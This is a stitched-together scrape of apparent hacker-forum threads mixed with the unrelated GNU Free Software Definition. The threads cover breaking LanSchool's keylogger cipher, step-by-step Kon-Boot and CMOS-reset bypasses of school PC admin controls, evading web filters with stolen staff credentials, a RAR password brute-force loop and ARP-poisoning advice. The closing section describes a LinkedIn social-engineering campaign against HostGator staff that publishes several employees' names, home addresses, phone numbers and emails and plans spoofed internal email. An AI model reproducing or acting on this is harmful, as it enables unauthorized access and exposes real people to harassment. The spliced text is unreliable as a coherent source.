If the malware circumvents the machine at the system level, say like a meterpreter or metasploit attack that has FULL access to everything, well, its pretty much game over at that point. Live disc boot and backup files, format and reinstall, then a restore is about the only option left when that happens. But if the malware was isolated to one users account, or not able to circumvent up to the administrators account, then create a new one, move the files you need, delete the old acocunt. I've done this for people in the past with minor system problems from malware and just general corrupted registry issues.\n", "\n\n\nIts an option, but I admit, one option that may not work in every case.

About the only thing you can't protect against is full physical access to a machine(like opening the case and bypassing a BIOS password via CMOS battery or removing the HDD to put into another machine), but you can at least turn off the autorun for all drives using group policy (not just CD-Rom drives) and change the service for \"Shell Hardware Detection\" from Auto or Manual to \"disabled\" until you need to use it. You should also put a bios password on the machine and set it not to be able to boot from cd and usb devices. I have mine set so you can't even get to the hdd to boot without a password, one for the bios, and one for the HDD. Not all machines will have that option though, but most should have one for the BIOS itself.\n\nAgain, physical access would not prevent someone from getting at things if they wanted to, but this is at least a small deterent from being able to boot a Live disc or run anything off USB.

It has features such as remote control (local user loses all control), task manager disabling, port 80 blocking, and keylogging. The keylogger, which stores its information on the computer from which the data is captured, is especially vulnerable to exploitation, as it may contain passwords and other sensitive data that people may have typed on the computer.\n\nThis article details a proof of an exploit of the LanSchool program. Pink Hat Hackers does not support, condone or recommend the use of it in real life.\n\nSimilar work on LanSchool 7.2 can be found at http://hak5.org/forums/index.php?showtopic=11920.\n\nSOLUTION:\n\nDon't use LanSchool or wait for the encyrption scheme to get an upgrade.\n\n------------------------------------------------------------------------\n\nThe LanSchool keylogger stores its data in a file called 'lskdata.bin' encrypted using a slightly modified substitution cipher. Every key can have one of four possible single byte values based on the byte's absolute position in the file, mod 4. For example, if the letter 'a' was encoded at position 739, its value would be 106, because this is the value for 'a' at position 3 (739 % 4 = 3). Clearly, by typing four consecutive characters of 'a' and reading the output, one would have enough information to consistently decode this letter. This technique was used to generate the table of character-value associations at the end of this text.\n\nReading in one of the files using these tables to automatically look up each character was very successful.\n\nNOTES:\n\nIf one holds down the shift key and presses multiple letters, LanSchool seems to only record the first letter as capitalized. This may be a bug in their code, or it may suggest a lack of complete understanding of the system, but this means that capital letters typed in succession may not be read correctly (e.g., \"ABCdEF\" might be read as \"AbcdEf\").\n\nFurther, LanSchool only stores the last 50,000 keypresses. The information would have to be gathered and merged periodically to maintain a full record. However to quote the LanSchool website (lanschool.com) that is \"Weeks of keystrokes.\"\n", "\nAPPENDIX:\n\nThe following is a fairly inclusive table of letters and their encrypted values based on a modulus of absolute position.\n\n\n\n\n\n", "\nLanSchool released a patch in version 7.4.1.4 that changed the encryption slightly. So far, we have confirmed that they modified which values are mapped to which characters, but everything else seems to be the same. Thus, the table in our second post is now incorrect for version 7.4.1.4, but the information in our first post should still be fine.\n", "\n\n\nThe files are encoded as binary data, so it would be expected that they'd look nonsensical in Notepad (each letter you see is how the computer tried to make sense of what was really numerical data). You might try XVI32 or any other hex editor. All programming languages also have the ability to read in files as binary data, which is useful for processing the lskdata.bin file.\n\nOne thing you should note, though, is that if you type a single character about 8 or more times (many more if you want it to be noticeable), you can see a distinct pattern using either Notepad or a hex editor. The binary values begin to repeat themselves after 4 repeated characters, as described on the website. Using this information, you may see how one could create a table of which 4 values correspond to which character by typing each letter at least 4 times and looking at the output. This table could be used to decode any lskdata.bin file.\n\nAlso we will soon be adding the additional table for the current version; more to follow both here and on PinkHatHackers.net.\n", "\n\n\nIn fact we have, if you look on our site, pinkhathackers.net, under the Demo section you will find a decoder that you can upload your lskdata.bin file to.\n\nHowever we must emphasize that the one on our website as of now only decrypts lskdata.bin files from versions older than 7.4.1.4. With that version they modified their cipher slightly. We have cracked it but haven't yet updated the decryption engine on our website.\n", "\nWe now have the new LanSchool version 7.4.1.4 table and the demo decrypter on our website. \n\n@x-quisite: If you can't get h2oh4x's program to work, you can either try running it in XP Compatibility mode or simply use our website instead (http://pinkhathackers.net/decryptor.php). h2oh4x's program seems only to decrypt lskdata.bin files from LanSchool versions 7.4.1.3 and older, though this would only require a revised key map table to fix.\n\n@smd75jr: Our major concern with LanSchool was its keylogger. The use of these programs for monitoring is, to us, less intrusive than stealing passwords. Further, most of these programs can be killed by using taskkill.exe, so you may look for a solution similar to the batch files that can be found on our site (http://pinkhathackers.net/downloads.php).\n"], "webjockey\u00a0\u00a0": ["\nOur school, in the UK, also has a feature like this, its called SIMs (School Information Management System). It does exactly the same thing as Lanschool, but our teachers have their workstations connected to a 100inch \"Activboard\" so they can basically broadcast whatever you are doing, if you want them to or not. Also, our school has a URL/Keyword blocking system, it sometimes back fires (and also blocks for some wiiierd reasons e.g. Humour). And, also, they have locked down everything about the workstation: We cannot right click on the taskbar. We cannot Ctrl,Shift,Escape to get the task manager. Logging in and out is controlled by a daemon (RMTutor) that starts on boot (before the login) and stops last. It isn't connected in anyway to SIMs or the Website blocking feature (SWAN). We can't open executables either. We can't change our desktop. We cannot save things to the desktop (Because all our files are stored in our own private (virtualised) server which is linked to our \"My Documents\" folder. Most of this information is not really necessary to my explanation, but it is all I know about the architecture of the school systems (the network is a star network where the \"main\" star's nodes are more switches for more stars). \n\nWhen we were looking at removing SIMs functionality, we decided we would stop it at its own will. To do this, we opened a file that needs to be saved (Word, Spreadsheet, Powerpoint, Text, RTF, anything that needs to be saved, I generally used Word). We then entered some data into that window (so that it needs to be saved). We then logged off. This made all the background processes to close down (except RMTutor) before we were asked if we wanted to save the file we just created. Just click \"Cancel\" here, and you won't be logged off, and your workstation is no longer available to the teacher.\n", "\n\n\nHmmm, yeah. RM (Research machines for those who don't know) have locked things down pretty far. they have actually edited Microsoft's code to get their security features to work <- logging on, and off, and changing password is all controlled by RM now, but I don't think RM themselves changed Group Policies, that was our Technicians. No more quake for us :( (except Quake Live, I don't think they have discovered that yet, but it won't be long).\n\nThere are ways to Bypass SWAN (URL/Keyword blocking):\n\nEarlier, you could use a proxy. but now they are mostly blocked.\n\nYou could also use the translate website feature, but most of the translators are now blocked.\n\nIn some situations, using the IP does work, (if they are blocking, say a URL and not a keyword in the site)\n\nAnd in certain situations, only one page in a massive archtecture is blocked: Google Images was once blocked, so to get it back, you typed the query code straight into the address bar, and it came up with the results page, which wasen't blocked).\n\nFinal solution: Find a staff username and password, and use it to bypass the warning and get to whatever you want, this is by far the riskiest. especially as keylogs of your activity are taken and stored (so they will know that somebody accessed a site, and used the address, and if it is at a 'dubious' time, then, well, its too risky to be worth it)\n\n@Manuel, sometimes, bypassing the school systems is for convenience, and to get something which we rightfully should have. I mean, sure it would be great to notify our technician that Google Images isn't working, and that it needs to be unblocked. But that requires me getting to his office in my own time (and he is often not there). Telling him, and then waiting a few days for 'changes to take effect' (for him to get his arse into gear and make the changes). Or, I could have some fun, figuring out a solution. It would take less time, be less frustrating, and more rewarding :)\n", "\nI don't get it, you guys are thinking too hard about this.

But seriously do any of you even watch hak5 if you did you would easily have your work around solution and wouldn't need to ask such questions.\nTBH I am yet to look at their recent build and have a fiddle at a work around solution for it. With that said I am assuming much is the same with the previous one and if you simply wish to remove it, its just a matter of having the right privileges on the local machine and the installer to remove it. CBF testing it with the latest build due to assignments and work commitments (the irony seeing as I am currently employeed in the IT department of a school). \n\nStep 1: Download Kon-Boot and burn it to a CD with roxio, nero, free iso burner etc or create a bootable usb key. Don't worry about the quick download its only a couple of KB's in size.\n\nStep 2:Log into your workstation as per normal  (into the domain) go to start run and type cmd. At the command prompt type net user and hit enter. You should see all the accounts that are on that local machine. In most case's the help desk department would image each machine with the same settings and the Adminstrator account is usually changed to another name such as Poweruser, superuser etc. Just take a note off all the accounts on a piece of paper\n\nStep 3: Restart your computer and boot the kon boot CD. Most schools wont stop you from booting off the cd but if they do and you need a password using the default loggin for your student ID (or workstation loggin prior to you having to change it when you first started school) works a treat seeing as they usually conform to a common password structure. Follow the prompts through kon-boot until you reach the login screen.\n\nNote: If you are unable to get the password to boot off the CD or change the bios just wait for your teacher to take a well deserved coffee break, unplug power, pop open case and remove the watch battery on the mother board for a few seconds to reset it.\n\nStep 4: select login into this computer (locally not into the domain) and enter one of the user names that you suspect is for the admin account and just hit enter, kon-boot will by bass the password for you.\n\nstep 5: Once in Use the lan school installer (you may wanna download that to a usb mem stick before hand) to remove the installed lanschool software from your workstation permanently. If for some reason the new version requires a password or something to remove it. Just fire up regedit and mess with/remove the registry entry for lanschool which will bork it up.\n\nNote: seeing as you already have admin on the box you may as well create a new admin account for yourself and set it up to your pleasing with your fav browser firefox, fox proxy to bypass the content/url filtering etc. Now when ever you wanna log in you just log into the local machine and not the domain. To get web browsing n stuff you will just have to load a web browser and you will be prompted for your login credetials for the domain/your active directory account. Just login how you usually do with your student ID/user name and password and the proxy settings and such will load into your browser so you can surf as normal. Only diff now is you are on a box without lan school and are free to install/unistall as you wish.

From time to time we revise this definition to clarify it. If you would like to review the changes we've made, please see the History section below for more information. \n\nFree software is a matter of liberty, not price. To understand the concept, you should think of free as in free speech, not as in free beer. \n\nFree software is a matter of the users' freedom to run, copy, distribute, study, change and improve the software. More precisely, it refers to four kinds of freedom, for the users of the software: \n\nThe freedom to run the program, for any purpose (freedom 0). \n\nThe freedom to study how the program works, and adapt it to your needs (freedom 1). Access to the source code is a precondition for this. \n\nThe freedom to redistribute copies so you can help your neighbor (freedom 2). \n\nThe freedom to improve the program, and release your improvements (and modified versions in general) to the public, so that the whole community benefits (freedom 3). Access to the source code is a precondition for this. \n\nA program is free software if users have all of these freedoms. Thus, you should be free to redistribute copies, either with or without modifications, either gratis or charging a fee for distribution, to anyone anywhere. Being free to do these things means (among other things) that you do not have to ask or pay for permission. \n\nYou should also have the freedom to make modifications and use them privately in your own work or play, without even mentioning that they exist. If you do publish your changes, you should not be required to notify anyone in particular, or in any particular way. \n\nThe freedom to run the program means the freedom for any kind of person or organization to use it on any kind of computer system, for any kind of overall job and purpose, without being required to communicate about it with the developer or any other specific entity. In this freedom, it is the user's purpose that matters, not the developer's purpose; you as a user are free to run a program for your purposes, and if you distribute it to someone else, she is then free to run it for her purposes, but you are not entitled to impose your purposes on her. \n\nThe freedom to redistribute copies must include binary or executable forms of the program, as well as source code, for both modified and unmodified versions. (Distributing programs in runnable form is necessary for conveniently installable free operating systems.) It is ok if there is no way to produce a binary or executable form for a certain program (since some languages don't support that feature), but you must have the freedom to redistribute such forms should you find or develop a way to make them. \n\nIn order for the freedoms to make changes, and to publish improved versions, to be meaningful, you must have access to the source code of the program. Therefore, accessibility of source code is a necessary condition for free software. \n\nOne important way to modify a program is by merging in available free subroutines and modules. If the program's license says that you cannot merge in a suitably-licensed existing module, such as if it requires you to be the copyright holder of any code you add, then the license is too restrictive to qualify as free. \n\nIn order for these freedoms to be real, they must be irrevocable as long as you do nothing wrong; if the developer of the software has the power to revoke the license, or retroactively change its terms, without your doing anything wrong to give cause, the software is not free. \n\nHowever, certain kinds of rules about the manner of distributing free software are acceptable, when they don't conflict with the central freedoms. For example, copyleft (very simply stated) is the rule that when redistributing the program, you cannot add restrictions to deny other people the central freedoms. This rule does not conflict with the central freedoms; rather it protects them. \n\nFree software does not mean non-commercial. A free program must be available for commercial use, commercial development, and commercial distribution. Commercial development of free software is no longer unusual; such free commercial software is very important. You may have paid money to get copies of free software, or you may have obtained copies at no charge. But regardless of how you got your copies, you always have the freedom to copy and change the software, even to sell copies. \n\nWhether a change constitutes an improvement is a subjective matter. If your modifications are limited, in substance, to changes that someone else considers an improvement, that is not freedom. \n\nHowever, rules about how to package a modified version are acceptable, if they don't substantively limit your freedom to release modified versions, or your freedom to make and use modified versions privately. Rules that if you make your version available in this way, you must make it available in that way also can be acceptable too, on the same condition. (Note that such a rule still leaves you the choice of whether to publish your version at all.) Rules that require release of source code to the users for versions that you put into public use are also acceptable. It is also acceptable for the license to require that, if you have distributed a modified version and a previous developer asks for a copy of it, you must send one, or that you identify yourself on your modifications. \n\nIn the GNU project, we use copyleft to protect these freedoms legally for everyone. But non-copylefted free software also exists. We believe there are important reasons why it is better to use copyleft, but if your program is non-copylefted free software, it is still basically ethical. \n\nSee Categories of Free Software for a description of how free software, copylefted software and other categories of software relate to each other. \n\nSometimes government export control regulations and trade sanctions can constrain your freedom to distribute copies of programs internationally. Software developers do not have the power to eliminate or override these restrictions, but what they can and must do is refuse to impose them as conditions of use of the program. In this way, the restrictions will not affect activities and people outside the jurisdictions of these governments. Thus, free software licenses must not require obedience to any export regulations as a condition of any of the essential freedoms. \n\nMost free software licenses are based on copyright, and there are limits on what kinds of requirements can be imposed through copyright. If a copyright-based license respects freedom in the ways described above, it is unlikely to have some other sort of problem that we never anticipated (though this does happen occasionally). However, some free software licenses are based on contracts, and contracts can impose a much larger range of possible restrictions. That means there are many possible ways such a license could be unacceptably restrictive and non-free. \n\nWe can't possibly list all the ways that might happen. If a contract-based license restricts the user in an unusual way that copyright-based licenses cannot, and which isn't mentioned here as legitimate, we will have to think about it, and we will probably conclude it is non-free. \n\nWhen talking about free software, it is best to avoid using terms like give away or for free, because those terms imply that the issue is about price, not freedom. Some common terms such as piracy embody opinions we hope you won't endorse. See Confusing Words and Phrases that are Worth Avoiding for a discussion of these terms. We also have a list of translations of free software into various languages. \n\nFinally, note that criteria such as those stated in this free software definition require careful thought for their interpretation. To decide whether a specific software license qualifies as a free software license, we judge it based on these criteria to determine whether it fits their spirit as well as the precise words. If a license includes unconscionable restrictions, we reject it, even if we did not anticipate the issue in these criteria. Sometimes a license requirement raises an issue that calls for extensive thought, including discussions with a lawyer, before we can decide if the requirement is acceptable. When we reach a conclusion about a new issue, we often update these criteria to make it easier to see why certain licenses do or don't qualify. \n\nIf you are interested in whether a specific license qualifies as a free software license, see our list of licenses. If the license you are concerned with is not listed there, you can ask us about it by sending us email at <licensing@gnu.org>. \n\nIf you are contemplating writing a new license, please contact the FSF by writing to that address. The proliferation of different free software licenses means increased work for users in understanding the licenses; we may be able to help you find an existing Free Software license that meets your needs. \n\nIf that isn't possible, if you really need a new license, with our help you can ensure that the license really is a Free Software license and avoid various practical problems. \n\nBeyond Software\n\nSoftware manuals must be free, for the same reasons that software must be free, and because the manuals are in effect part of the software. \n\nThe same arguments also make sense for other kinds of works of practical use \u2014 that is to say, works that embody useful knowledge, such as educational works and reference works. Wikipedia is the best known example. \n\nAny kind of work can be free, and the definition of free software has been extended to a definition of free cultural works applicable to any kind of works. \n\nOpen Source?\n\nAnother group has started using the term open source to mean something close (but not identical) to free software. We prefer the term free software because, once you have heard that it refers to freedom rather than price, it calls to mind freedom. The word open never refers to freedom. \n\nHistory\n\nFrom time to time we revise this Free Software Definition to clarify it. Here we provide a list of those modifications, along with links to illustrate exactly what changed, so that others can review them if they like.\n\nVersion 1.77: Clarify that all retroactive changes to the license are unacceptable, even if it's not described as a complete replacement. \n\nVersion 1.74: Four clarifications of points not explicit enough, or stated in some places but not reflected everywhere: \n\n\"Improvements\" does not mean the license can substantively limit what kinds of modified versions you can release. Freedom 3 includes distributing modified versions, not just changes. \n\nThe right to merge in existing modules refers to those that are suitably licensed. \n\nExplicitly state the conclusion of the point about export controls. \n\nImposing a license change constitutes revoking the old license. \n\nVersion 1.57: Add \"Beyond Software\" section. \n\nVersion 1.46: Clarify whose purpose is significant in the freedom to run the program for any purpose. \n\nVersion 1.41: Clarify wording about contract-based licenses. \n\nVersion 1.40: Explain that a free license must allow to you use other available free software to create your modifications. \n\nVersion 1.39: Note that it is acceptable for a license to require you to provide source for versions of the software you put into public use. \n\nVersion 1.31: Note that it is acceptable for a license to require you to identify yourself as the author of modifications. Other minor clarifications throughout the text. \n\nVersion 1.23: Address potential problems related to contract-based licenses. \n\nVersion 1.16: Explain why distribution of binaries is important. \n\nVersion 1.11: Note that a free license may require you to send a copy of versions you distribute to the author. \n\nThere are gaps in the version numbers because there are many other changes that do not affect the substance of the definition at all. Instead, they fix links, add translations, and so on.

If that's true it would drastically cut down the size of my wordlist.\n\nI went back to the original perl script and removed the underscore from the word variable, which produced a much smaller wordlist:\n\nsed 's/arrpirate_/arrpirate/g' permulate.pl > permulate2.pl\n\nperl permulate2.pl > wordlist\n\nwc -l wordlist\n\n362880 <-- already 3 million lines shorter\n\nsort -u wordlist > wordlist2\n\nmv wordlist2 wordlist\n\nwc -l wordlist\n\n30240 <-- that's better\n\nThis shouldn't take near as long to go through:\n\n30240/10 = 3024 seconds\n\n3024/60 = 50 minutes\n\nLet's put an underscore at the end of each word:\n\nsed 's/$/_/g' wordlist > wordlist2\n\nmv wordlist2 wordlist\n\nThat's much better.  I'm going to split the wordlist in half and run 2 simultaneous threads to shorten the time:\n\n30240/2 = 15120\n\nmkdir thread1\n\nmkdir thread2\n\ncp arr_pirate.rar thread1/\n\ncp arr_pirate.rar thread2/\n\nhead -15120 wordlist > thread1/wordlist-thread1\n\ntail -15120 wordlist > thread2/wordlist-thread2\n\nIn terminal 1:\n\ncd thread1\n\nwhile read pass1; do rar e arr_pirate.rar -p$pass1; done < wordlist-thread1\n\nIn terminal 2:\n\ncd thread2\n\nwhile read pass2; do rar e arr_pirate.rar -p$pass2; done < wordlist-thread2\n\nI also opened 2 more terminals and ran this command in each one:\n\ncd thread1 (obviously using thread2 for the 4th terminal)\n\nwhile true; do sleep 5; ls -ltr; done\n\nEach one took roughly 30 minutes (I forgot to time them) but neither extracted the contents of the rar file.\n\nSo, either I did something very wrong (which is possible) or the password does not end with an underscore.\n\nBTW, some of you guys are using older versions of WinRAR which might cause problems extracting newer files.

Servers need server parts for a reason, mainly because consumer kit is designed to be used like standard pc while a server is designed to be run solidly for 2-3 years.

Hyper-V is also good, but its a less mature product and it will take several revisions for Microsoft to get this right, very much worth keeping your eye on though.\n\nAs for RAID layouts, use RAID5 for virtual drives that will serve information and RAID1 or RAID10 for the drives the virtual machines will use to store the OS partitions, depending on the speed of your disks (7.2K nearlines, 10K or 15K SAS).\n", "\nI may have over-egged the pudding somewhat lol.\n\nBTW, you can boot ESXi from a USB stick which could be better then installing it.

Just use the Windows one.  Windows XP SP3 is pretty well locked down anyway.\n", "\n\n\nWell, the OP could create a shared-secret using a PSK and Javascript to create the level of security I think he's looking for.\n", "\n\n\nThat's of course assuming that the attacker didn't create a rogue CA, or recover the private key of a trusted CA.  I agree with you and stringwray that a Javascript solution does not provide the same level of security as a full, properly configured, SSL session.  But, at the same time, the OP doesn't seem to be too concerned with security and it would fit his requirements.\n\n\nPSK fails to work with multiple users and the requirement that good passwords means passwords are regularly changed.\n\nIt doesn't fail, it just becomes more difficult since the admin has to do more than just set a domain policy and wait for angry users to call.  But of course, you could implement the policy features yourself, server-side, that checks for the requirements you're looking for.\n", "\n\n\nWell, you're assuming that the only way to create a rogue CA is to use a bunch of PS3's playing with MD5 and hoping you get the right information from the CA.\n\nAnd that's simply not the case.\n\nThat is sort of off-topic, though.\n\nIf the OP really wants to do this all in PHP and Javascript, I don't think we should tell him it's not possible.  He could perform a DHE exchange that way and incorporate RSA certs, effectively doing the SSL without using the SSL libraries. Or use a salted PSK, or many other ways.  I think we've all clearly suggested that using SSL is the superior plan of attack, but if he really doesn't want to do it, shouldn't we be suggesting options that fit his requirements?\n", "\n\n\nThe attack you're talking about was one way, and it relied on a lot of tech.  I'm suggesting that there are possible other ways to fake a trusted CA, maybe not involving lots of tech.  Perhaps breaking into the building where the information is stored.  Or perhaps there's a publicly unknown break in SHA-1 that people are currently using to keep themselves afloat in a struggling economy.  \n\nAlthough unlikely, those avenues are still possible methods of pursuit-- and before the MD5 break a few years ago, I'd probably say they were all equally likely.  \n\nSo you're saying there's no possible way to MITM an SSL stream?  Yeah, that sounds reasonable, sure.  [/sarcasm]\n\n\nIt isn't possible without setting up an entirely new version of SSL that incorporates approved CA's.  ... and useless information...\n\nSure, I'm saying the OP could do the math himself.  After all, we're all big boys and girls here and we can all read Applied Cryptography, the Handbook of Applied Cryptography, or hey, maybe even the OpenSSL source code.\n", "\n\n\nNo one's arguing against your ability to sniff cleartext, digip.  I believe the suggestion was to use Javascript to encrypt the data before sending it to the server.\n\nSparda,\n\nThe method for the determining if the certificate is valid or not would be the same regardless of whether or not you use the SSL libraries.  Your operating system has the trusted CA cache, why can't your home-brew method verify against them?  \n\nI don't mean to insult anyone's intelligence, but I think the problem is that there's some confusion between implementing a protocol and that protocol \"being encryption\".  SSL is a set of protocols.  You can re-implement those protocols in another language without using pre-made libraries and they will act just the same.  You don't suddenly lose the ability to verify RSA certificates by using your systems trusted roots just because you choose to not use mod_ssl.\n", "\n\n\nYour post is basically unintelligible.  But I can try to surmise what you're trying to say, so please correct me if I'm wrong.  Without the client being able to cryptographically validate the server's certificate, the connection can be MITM'd by someone presenting an invalid certificate. \n\nRight, that's essentially how that sort of thing works.  You can, however, create your own certificates and install it as a trusted root on the client machine through some other secure method.  Given the OP's original constraints, this seems reasonable.\n", "\n\n\nI have this odd feeling that you've never read the details of how a DHE exchange works.\n\nAnd Sparda,\n\nThat's true, you'd have to distribute the certificate to every user that you'd want to use the site.  The OP didn't make any mention of how many users he expected.  I know that for my work, the \"trusted\" CA's aren't trusted enough, and we have to use a method of distribution similar to what is described here (although, we don't play around with doing it in Javascript and PHP, we use industry standards for the negotiation of the protocol).\n", "\n\n\nWell sure, you can intercept it, that's why no one uses DHE by itself, but follows it up with RSA certificates.  I'm not quite sure how a passive attacker could not intercept this sort of traffic, but that's neither here nor there.  I'm sure it depends on how you define passive and across what medium the exchange takes place. \n\nNonetheless, if you're interested in this topic, I'd really recommend the books I listed earlier ( Applied Cryptography, Handbook of Applied Cryptography ) as they both cover the topic pretty well ( I have my biases and reservations for both, but either should suffice).  Or the O'Reilly book called...something like, \"Network Security with OpenSSL\", covers the topics rather briefly but has useful code examples if you're wanting to roll your own SSL solution.\n", "\n\n\nI apologize if English is not your first language; it's not mine either.  But it's very difficult to understand what you're trying to say with improper words being used and terrible grammar.\n\nAgain though, I think we're on the same page, generally, we just disagree over the terms.\n\n\nHow about I combine it with java applet?\nCan it secure my website?\n\n\nSure.  That would be a similar case.  It would be easier to do this via HTTPS, but if you're gung-ho for Java* solutions: go for it, it's possible.\n", "\n\n\nLikely not.  If you just have a home router/switch (Linksys, Netgear, SoHo-style whatever) and your Dad or whoever properly configured those devices to deal with DHCP then you should be fine to reset the router. \n\nAnd if it does, what did you lose?  He'll just reconfigure it and you'll be out nothing.\n", "\n\n\nIt doesn't sound like this is possible given his situation.  If he could physically add a firewall between the gateway and the rest of the nodes, he could physically unhook the cable.  \n\nThere's really not enough information here to answer his question completely, but Deauthing probably won't work either as he doesn't really imply there's any authentication needed to use the LAN.\n\nFurther, he doesn't allude to it being a corporate situation.  So there's probably not a \"boss\" to report him to, and it sounds like he did report it to who he thought could help.\n\nListening to the question would probably help before trying to give advice. \n\nIf we take his question as completely hypothetical, or in a controlled lab environment for educational purposes, one might suggest looking at routing protocols.  Ideally, if you want this \"rogue\" user to stop using more than his fair share of the bandwidth, you could become his gateway through any number of methods (you're on the same LAN, look up LAN attacks including ARP cache poisoning).  From there you should set up your computer to properly act as his gateway and just throttle his connection speeds for the given Bittorent port.\n\nThis way no one is DOS'd, and you still get to call home.\n", "\n\n\nAgain, where's he going to put the hardware firewall? In between his connection and the router would do no good as it would have no effect on the rogue user.  He all ready stated that he has no access to the router (which seems to imply where their connections come from), so it seems unlikely that he'd be able to just wander into the switch cabinet and add a device.\n\nHowever, if he were to make himself the rogue user's gateway (through whatever means you'd like -- ARP Poisoning was just an example; and what percentage of users use static ARP tables?) then this is a nonissue all together since he would effectively be the administrator of the rogue client's network and would get the same benefits of a hardware firewall.\n\nFurther, blacklisting, in general is silly.  Read a security book.  You want to whitelist.  And what packet signature would you expect the firewall to pick up if the Bittorrent client is using encrypted transport?  Random bytes to random IPs on random ports is a ridiculous idea to try to blacklist.\n", "\n\n\nDid that even make sense in your head?  \n\nYou want him to try to document all the trackers this guy's going to be using and hope he's not using DHT?  Who doesn't use Azureus with encrypted transport?  (DHT + no packet signature by default).\n\nBlacklisting is not the answer for this.  The elegant solution allows him to have the greatest control over the other guy's network speeds, not hoping that the other guy isn't as good as the vast majority of users on the Internet.\n", "\n\n\nGlad you finally agree with me Sparda, that getting in between the rogue user's connection and the gateway is the way to go.\n", "\n\n\nIs that really a problem?\n", "\n\n\nFrom this guy's scenario it doesn't sound like he's got a lot of options.

Then just much slower upload and download speeds. It seemed to just clear itself up after I got a firewall on the Network you see though I was never able to successfully add the firewall to the network. I tried to add a Zyxel model USG50 I thought this firewall and intrusion detection detection unit was defective. It would not allow me to assign me IP addresses that were different than 192.168.1.1. Which is the Verizon Actiontec routers default. I assigned a static IP for the WAN that was applied ok and the problem comes to the Lan it will not let me change that IP address. My brother and I have tried a last resort hard reset multiple times. Then we took it back and got a USG 100 supposedly Enterprise class same exact problem. This time before attaching I want to a website called F-Secure and ran all their Virus scans. Still nothing there. The same effect. I am convinced that this is a rootkit on or something along those lines from all the Hak5 shows I have watched. I believe it's the router itself that's infected and infecting and controlling the other computers. It even turns on the webcam on my macbook once or twice. Where does one even begin with an infection like this. Please help me because this is just so insanely off the wall.

Applejack is a single user command line interface utility for macs. When I would run it in the past the VRAM and all the Cache. Files would need to rebuilt. In addition all network settings would have to be reconfigured. This is not the case. All the networks are in the computers memory despite running Applejack and resetting the PRAM for you MAC users out there. This is brand new highly erratic behavior and I have had Macs for over 14 years. The same occurs on my G4 tower. In addition despite a perfectly clean install of windows the laptop within turning back on goes right back into it's unusual opening programs. Freezing and these are two brand new toshibas.

Here is how I have my network setup because it has to be this way as per Verizon's design. This router is the first device in the network. It is the Access Point,Router,Gateway and Wireless Access Point.  That is the Actiontec model MI424-WR-Rev.E. I then after all those problems directly connected my laptop to Verizon AP. The connection is a direct Ethernet connection no switches or firewall in the way. In fact tomorrow I am downloading spice works just to see before I shut down wireless if anything ellse is on the Network. I am really curious if their is some freaking leeching. I really thank you guys for all the advice. I think the crucial and best advice is to shut off the wireless and lock it down I guess Mac address authentic is the best I can do. I do have the wiireless security set to WPA2 and that surprises me even more because that is the best security I can get. I like your idea of the NUKE cd and basically this falls back on Verizon. I will definitely follow your advice but, three direct ethernet connect laptops to Verizon's AP router and it's still slow it has to be them.\n", "\nYes, I do admin access and Verizon is refusing to help with any of my security concerns. Mine thank God is not an old Actiontec but, it just got a Firmware change mysteriously. Here is it's current revision E model running F firmware.  Here some of the recent settings I captured. The best guys is that the Nintendo Wii,Playstation3 and my Roku Box are setup as Wi-Fi hot spots. How do I know? I have an Indian friend who came over and he told me that this how no matter how many times you clean your laptops or computers. The virus just will come back because they will always get out and connect to some else's router. Then I was told by the Verzon Rep. he can do nothing for me but, change my password.

Using linkedin we can connect to people, head hunt, and also phish for information to cause mischief. I decided to play with my friends over at hostgator some more. \nIf you go look up people by searching by the company name \"Hostgator\". There was tons of results. I couldn't view any profiles or see names. Then if I connected with people outside the company I wouldn't be able to see their full names or pictures. Hmmm...\nI created a account under the name Brian Johnston, I used one of my email handles that directly associates to me if you google it also. So I really wasn't hiding too much. I said I went to a local college, Lone Star Community College, and I had the position as a Linux Administrator. I also stated that I had held that position for close to a year. I even googled a picture \"friendly person with smile\"\n\nNow I started trying to connect to people saying we had done business together at hostgator. Next thing you know I had connected with 6 people. I was then able to browse their connections and find more employees.\nNow where getting somewhere. I now got a hand full of connections. I know there email addresses by looking at the profile information and there are some with company email addresses listed on the profile. The format is the first letter of first name then last name @ hostgator.com . Now that I know that, even if linkedin doesn't allow me to use \"we done business together\" we just guess by looking at the profile name and use the basic format, maybe even try both to be sure. \nWe have a ton of connections by this point.\n\nWhat more do we need? Phone numbers and addresses! So we haul over to whitepages.com and start looking up the names and general location our profiles show us. By doing that we now have the hostgator.com perl developers home address, and telephone number along with his personal email account on his linkedin profile. We did this with many more also.\nGary Warman - Perl Developer - gwarman@hostgator.com warman.t.gary@gmail.com\n(512) 642-3137, 112 Tanglewood Ln, Hutto, TX 78634-5106\nwhitepages - http://tinypic.com/r/s3oksj/5\nlinkedin - http://tinypic.com/r/2w7ny1z/5\nKyle Andrews - Linux Security Administrator - kyle.gato@gmail.com kandrews@hostgator.com\n2828 Hayes Rd, Houston, TX 77082-6633\nLinkedin - http://tinypic.com/r/w19nyg/5\nCollin Lavrinc - Shift Lead - clavrinc@hostgator.com\n11111 Saathoff Dr, Apt 1007, Cypress, TX 77429-3013\nNow what do we need?

I pretended I had a bad connection and got the chat tech to email me so I could see his signature. SS here - http://tinypic.com/r/2qkus82/5 . We could also use the ticket system and keep asking questions and gathering other peoples information also.\nWhat do we do from here? Find a open smtp relay. After finding a smtp relay we can now spoof legitimate looking messages from one employee to another. If you know the company has mailing lists ;) Send messages to the mailing lists.

Imagine spoofing emails to all the employees, scheduling work to multiple servers, multiple accounts, this would have been horrible. Accounts could have been lost, data damaged, had the employees turn on each other. This could have been really, really bad. Is hosting with Hostgator a good thing?

Brent accused me of \"email bombing\" the company awhile back.

Instead of being 13-10  person wait. When logging in I was about 25, so I figured each office was having a meeting.\nOne thought was to start writing emails to each employee telling them they had the rest of the night off paid don't ask no questions. If I waited I was going to try to get my past tickets from HR. Send the HR lady on a secrete mission to get the files prepared and emailed off with a promise of a bonus to not tell anyone, not even \"Brent\" because people inside the company monitor his communications.

